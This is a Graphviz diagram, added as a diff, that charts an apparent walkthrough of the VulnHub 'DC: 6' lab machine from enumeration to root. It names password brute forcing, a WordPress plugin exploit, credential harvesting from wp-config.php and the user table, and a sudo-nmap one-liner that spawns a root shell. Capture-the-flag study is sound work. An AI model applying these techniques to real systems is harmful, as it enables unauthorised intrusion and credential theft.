@@ -1,0 +1,63 @@
+digraph G {
+  #rankdir=LR;
+  nodesdictep=1.0; splines="line"; K=0.6; overlap=scale; fixedsize=true; resolution=72; bgcolor="#f9f9f9"; outputorder="edgesfirst";
+  node [fontname="courier" fontsize=18 shape=box width=0.25 fillcolor="white" style="filled,solid"];
+  edge [style=dashed color="#665957" penwidth=0.75 arrowsize=0.6];
+
+  0[label="192.168.92.170" color="navyblue" fillcolor="#ffffff" tooltip="[VulnHub] DC: 6"];
+  10[label="netcat: www-data" color="darkorange" fillcolor="#ffe0ac" tooltip="Phase #2:Exploitation"];
+  11[label="Phase #3: Privilege Escalation" color="red" fillcolor="#ffacb7" tooltip="Phase #3:Privilege Escalation"];
+  12[label="/var/www/html/wp-config.php" color="red" fillcolor="#ffacb7" tooltip="Phase #3:Privilege Escalation"];
+  13[label="mysql: wpdbuser/meErKatZ" color="red" fillcolor="#ffacb7" tooltip="Phase #3:Privilege Escalation"];
+  14[label="mysql" color="red" fillcolor="#ffacb7" tooltip="Phase #3:Privilege Escalation"];
+  15[label="select user_login, user_pass from wp_users;" color="red" fillcolor="#ffacb7" tooltip="Phase #3:Privilege Escalation"];
+  16[label="/home/mark/stuff/things-to-do.txt" color="red" fillcolor="#ffacb7" tooltip="Phase #3:Privilege Escalation"];
+  17[label="ssh: graham/GSo7isUM1D4" color="red" fillcolor="#ffacb7" tooltip="Phase #3:Privilege Escalation"];
+  18[label="shell: graham" color="red" fillcolor="#ffacb7" tooltip="Phase #3:Privilege Escalation"];
+  19[label="/home/jens/backups.sh" color="red" fillcolor="#ffacb7" tooltip="Phase #3:Privilege Escalation"];
+  1[label="Phase #1: Enumeration" color="darkgreen" fillcolor="#cceabb" tooltip="Phase #1:Enumeration"];
+  20[label="sudo -u jens /home/jens/backups.sh" color="red" fillcolor="#ffacb7" tooltip="Phase #3:Privilege Escalation"];
+  21[label="shell: jens" color="red" fillcolor="#ffacb7" tooltip="Phase #3:Privilege Escalation"];
+  22[label="echo os.execute('/bin/bash') >nse && sudo nmap --script=nse" color="red" fillcolor="#ffacb7" tooltip="Phase #3:Privilege Escalation"];
+  23[label="shell: root" color="red" fillcolor="#ffacb7" tooltip="Phase #3:Privilege Escalation"];
+  24[label="/root/theflag.txt" color="red" fillcolor="#ffacb7" tooltip="Phase #3:Privilege Escalation"];
+  2[label="22/tcp" color="darkgreen" fillcolor="#cceabb" tooltip="Phase #1:Enumeration"];
+  3[label="80/tcp" color="darkgreen" fillcolor="#cceabb" tooltip="Phase #1:Enumeration"];
+  4[label="wordpress" color="darkgreen" fillcolor="#cceabb" tooltip="Phase #1:Enumeration"];
+  5[label="hydra: mark/helpdesk01" color="darkgreen" fillcolor="#cceabb" tooltip="Phase #1:Enumeration"];
+  6[label="Phase #2: Exploitation" color="darkorange" fillcolor="#ffe0ac" tooltip="Phase #2:Exploitation"];
+  7[label="wordpress: activity monitor plugin" color="darkorange" fillcolor="#ffe0ac" tooltip="Phase #2:Exploitation"];
+  8[label="wpscan: mark/helpdesk01" color="darkgreen" fillcolor="#cceabb" tooltip="Phase #1:Enumeration"];
+  9[label="edb:45274" color="darkorange" fillcolor="#ffe0ac" tooltip="Phase #2:Exploitation"];
+
+  subgraph cluster_0 {
+    node [style="filled,solid"];
+    label = "[VulnHub] DC: 6";
+    color = "#665957";
+    0 -> 1 [color="#665957"];
+    1 -> 2 [color="#665957"];
+    1 -> 3 [color="#665957"];
+    10 -> 11 [color="#665957"];
+    11 -> 12 [color="#665957"];
+    11 -> 16 [color="#665957"];
+    12 -> 13 [color="#665957"];
+    13 -> 14 [color="#665957"];
+    14 -> 15 [color="#665957"];
+    16 -> 17 [color="#665957"];
+    17 -> 18 [color="#665957"];
+    18 -> 19 [color="#665957"];
+    19 -> 20 [color="#665957"];
+    20 -> 21 [color="#665957"];
+    21 -> 22 [color="#665957"];
+    22 -> 23 [color="#665957"];
+    23 -> 24 [color="#665957"];
+    3 -> 4 [color="#665957"];
+    4 -> 5 [color="#665957"];
+    4 -> 8 [color="#665957"];
+    5 -> 6 [color="#665957"];
+    6 -> 7 [color="#665957"];
+    7 -> 9 [color="#665957"];
+    8 -> 6 [color="#665957"];
+    9 -> 10 [color="#665957"];
+  }
+}
